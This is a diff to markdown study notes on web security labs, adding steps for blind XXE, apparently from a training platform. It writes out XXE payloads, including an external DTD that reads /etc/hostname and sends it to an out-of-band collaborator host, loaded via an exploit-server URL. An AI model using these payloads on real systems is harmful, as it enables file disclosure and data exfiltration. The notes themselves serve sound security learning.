@@ -1431,9 +1431,24 @@ Interfere with an application's processing of XML to view files on the applicati
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ``` 
-- ddd
-- ddd
-- ddd
+- Blind XXE with out-of-band interaction
+  xxe SYSTEM "http://burp"
+  `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
+- Blind XXE with out-of-band interaction via **XML parameter entities**
+  % xxe SYSTEM "http://burp"
+  `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
+- Exploiting blind XXE to exfiltrate data using a malicious external DTD
+   - Store DTD payload   
+     ```
+     <!ENTITY % file SYSTEM "file:///etc/hostname">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://6mtezovlmkll41l5iasruysosfy6mxjl8.oastify.com/?x=%file;'>">
+      %eval;
+      %exfil;
+      ```
+   - exploit server > insert dtd body payload > click store button
+   - Repeater modified   
+     `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac8008703c35d7d8048bbea01cf0088.exploit-server.net/exploit"> %xxe;]>`
+   - Collaborator Poll Now > GET /?x=**ddd7bfff53e5** HTTP/1.1
 - ddd
 - ddd
 
@@ -1446,11 +1461,6 @@ Content for API...
 Details about CSRF...
 
 ### CSRF Lab
-
-## XSS (Cross-Site Scripting)
-Details about XSS...
-
-### XSS Lab
 
 ## CORS (Cross-Origin Resource Sharing)
 Details about CORS...
@@ -1471,6 +1481,11 @@ Details about DOM-based attacks...
 Details about WebSockets...
 
 ### WebSockets Lab
+
+## XSS (Cross-Site Scripting)
+Details about XSS...
+
+### XSS Lab
 
 ## Insecure Deserialization
 Content for Insecure Deserialization...
